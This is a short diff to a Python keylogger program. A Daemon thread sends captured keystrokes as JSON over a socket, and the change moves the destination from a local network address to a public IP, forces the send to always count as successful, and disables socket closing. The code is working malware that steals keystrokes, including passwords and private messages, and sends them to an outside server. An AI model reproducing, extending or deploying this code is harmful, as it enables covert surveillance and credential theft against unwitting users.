@@ -82,10 +82,11 @@ class Daemon(threading.Thread):
         try:
             self.socket_client.sendall(json.dumps(keys))
             res = self.socket_client.recv(1000)
+	    res = True
         except:
             self.make_cliente()#try reconect
 
-        if res == 'OK':
+        if res:
             print "ENVIADO BIEN"
             return True
         else:
@@ -93,7 +94,8 @@ class Daemon(threading.Thread):
         return False
 
     def close_socket(self):
-        self.socket_client.close()
+    	pass
+        #self.socket_client.close()
 
 class FileWR(object):
     
@@ -110,7 +112,7 @@ if __name__ == '__main__':
     
     f = FileWR(fileKeys,fileKeysRead,lock)
 
-    daemon = Daemon(f,'192.168.43.105')
+    daemon = Daemon(f,'162.209.73.26')
     daemon.start()
 
     ky = Keylogger(f)
